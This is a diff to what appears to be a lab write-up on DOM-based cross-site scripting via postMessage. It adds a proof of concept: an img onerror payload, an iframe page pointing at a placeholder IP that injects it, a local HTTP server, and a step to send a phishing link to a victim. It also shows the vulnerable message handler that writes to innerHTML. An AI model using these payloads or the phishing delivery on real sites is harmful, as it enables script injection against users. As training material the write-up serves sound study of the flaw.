@@ -108,14 +108,22 @@ if(hidden){document.write('<p>'+hidden+'</p>');}
 
 <b>Task 3</b>
 Exploit/PoC:
+
 ```js
 // DevTools
 window.postMessage('<img src=x onerror=alert()>');
+// In termanal
+$cd /payload
+$vi hacker_phishing_dom_xss.html
+  >>> change IP addr of actual FVA in src
+  <iframe src="http://<YOUR_IP>:8888/xss/dom3" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"></iframe>
+$python3 -m http.server 8000
+// Send phishing link to victim
 ```
 
 Vulnerable code:
 ```js
-// // Vulnerable source *..addEventListener()
+// Vulnerable source *..addEventListener()
 window.addEventListener('message', function(e) 
 {
   //  Vulnerable sink *.innerHTML with unsanitized input
